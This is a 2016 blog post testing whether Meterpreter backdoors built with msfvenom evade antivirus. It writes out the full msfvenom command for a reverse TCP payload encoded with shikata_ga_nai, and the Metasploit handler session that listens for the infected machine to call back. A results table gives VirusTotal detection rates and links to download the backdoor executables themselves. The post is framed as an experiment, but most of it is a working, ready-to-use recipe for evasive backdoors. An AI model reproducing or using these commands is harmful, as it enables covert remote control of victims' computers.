---
layout: post
title:  "Antivirus evading backdoors"
date:   2016-06-14 15:16:05 +0430
categories: 
---

Let's try to make a backdoor and see how well it can evade antivirus programs.

For this test case, we will use different tools:

- **msfvenom**: a command-line utility for creating backdoors that comes with [Metasploit](https://www.metasploit.com)
- [virustotal](https://virustotal.com): a website which allows to upload a file and have it checked by multiple antivirus programs
- **Windows XP**: we will execute the different generated backdoors on a Windows XP Professional SP2

The test case will each time be executed with the same steps:

1. Create a backdoor with a certain number of iterations (in this example 2):

   ```bash
   $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=8080 -f exe -e x86/shikata_ga_nai -i 2 > backdoor2.exe
   ```

   We will use the Meterpreter payload with a reverse TCP. The paramater LHOST represents the host to which we want to have our infected machine connect. The parameter LPORT corresponds with the port to which the infected machine should connect. We will use the x86/shikata_ga_nai encoding, which has a rating of excellent. The flag -i represents the number of iterations.

2. Start a handler to listen for the infected machine to connect back to the attacking machine:

   ```
   $ msfconsole
                                                  
   IIIIII    dTb.dTb        _.---._
     II     4'  v  'B   .'"".'/|\`.""'.
     II     6.     .P  :  .' / | \ `.  :
     II     'T;. .;P'  '.'  /  |  \  `.'
     II      'T; ;P'    `. /   |   \ .'
   IIIIII     'YvP'       `-.__|__.-'

   I love shells --egypt


          =[ metasploit v4.11.26-dev                         ]
   + -- --=[ 1539 exploits - 894 auxiliary - 265 post        ]
   + -- --=[ 438 payloads - 38 encoders - 8 nops             ]
   + -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

   msf > use exploit/multi/handler
   msf exploit(handler) > set LHOST 192.168.0.1
   LHOST => 192.168.0.1
   msf exploit(handler) > set LPORT 8080
   LPORT => 8080
   msf exploit(handler) > run

   [*] Started reverse TCP handler on 192.168.0.1:8080 
   [*] Starting the payload handler...
   ```

3. Copy the backdoor the Windows XP machine and execute it. Check if the backdoor executes with success.

4. Upload the backdoor to virustotal and check its result.

The conclusions may be found in the table below:

| Encoding iterations | Working? | virustotal detection rate | virustotal link | Download backdoor | 
| ------------------- | -------- | ------------------------- | --------------- | ----------------- |
| 0                   | Yes      | 34/48                     | [virustotal](https://virustotal.com/en/file/36b8a578e725b8b9d53305db6cc8e0640cbca21330875709fb00de0bfe37b8c7/analysis/) | [backdoor0.exe](/downloads/backdoor0.exe) |
| 1                   | Yes      | 30/44                     | [virustotal](https://virustotal.com/en/file/da2cbc3c7a9f92b7fdbfcab093ee2e2c431dd2ec379659a9e700d48fd0e8326d/analysis/) | [backdoor1.exe](/downloads/backdoor1.exe) |  
| 2                   | Yes      | 34/48                     | [virustotal](https://virustotal.com/en/file/0adae23c23f904aefad82d61bdd39d7f4611ebc7ab79242cf3d4bdc572170edf/analysis/) | [backdoor2.exe](/downloads/backdoor2.exe) |
| 10                  | Yes      | 29/44                     | [virustotal](https://virustotal.com/en/file/f5654c96ebf76aee40bf292a55da6cd3a1d71cc33d9cfcd48f54e7776c67c136/analysis/) | [backdoor10.exe](/downloads/backdoor10.exe) |
| 20                  | No       | 29/44                     | [virustotal](https://virustotal.com/en/file/4bfa0e92ca7ea2f31e33cbb87d3024c47027f672efdb45ca51bbea2a955b78f6/analysis/) | [backdoor20.exe](/downloads/backdoor20.exe) |



